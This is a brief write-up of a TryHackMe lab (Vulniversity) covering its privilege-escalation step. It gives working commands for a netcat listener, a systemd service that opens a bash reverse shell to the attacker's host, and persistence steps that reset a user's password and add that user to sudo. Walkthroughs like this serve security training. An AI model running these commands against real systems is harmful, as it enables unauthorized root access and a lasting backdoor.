# TryHackMe: Vulniversity Notes  

<br />

## Step 5
For step 5 I decided to take it one step further and create another shell rather than use systemctl to read the /root/root.txt

1. start netcat on your box
> ```
> nc -tlnvp 6666
> ```

2. back on the compromised host, set up service to create a shell back to our netcat listener
* A good reverse shell resource: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
> ```
> shell=$(mktemp).service
> echo '[Service]
> Type=oneshot
> ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<your ip>/<your port> 0>&1"
> [Install]
> WantedBy=multi-user.target' > $shell
> systemctl link $shell
> systemctl enable --now $shell
> ```

3. I wanted some persistence so looked for a user in /etc/passwd and confirmed ssh
> ```
> cat /etc/passwd
> passwd <user>
> usermod -aG sudo <user>
> systemctl status sshd.service
> ```
 